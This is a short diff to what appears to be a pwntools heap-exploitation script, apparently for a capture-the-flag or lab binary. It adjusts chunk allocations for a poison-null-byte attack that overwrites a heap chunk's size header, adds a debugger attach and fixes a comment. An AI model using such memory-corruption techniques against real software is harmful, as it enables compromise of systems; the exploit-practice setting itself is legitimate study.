@@ -34,14 +34,18 @@ def free(idx):
   p.sendlineafter("?\n", str(idx))
 
 A = alloc(size=0x108)
-B = alloc(size=0x200, payload=(0x1f0 - 8) * "A" + p64(0x200))
+B = alloc(size=0x210)
+# Later versions of glibc have an additional check for the size here
+# B = alloc(size=0x200, payload=(0x1f0 - 8) * "A" + p64(0x200))
 C = alloc(size=0x100)
 
 free(B)
+gdb.attach(p)
 
 free(A)
-# Poison null byte happens here. Overwriting the last byte of B's size header.e
+# Poison null byte happens here. Overwriting the last byte of B's size header.
 A = alloc(size=0x108, idx=A, payload="A" * (0x108))
+
 
 B1 = alloc(0x100)
 B2 = alloc(t="thing")
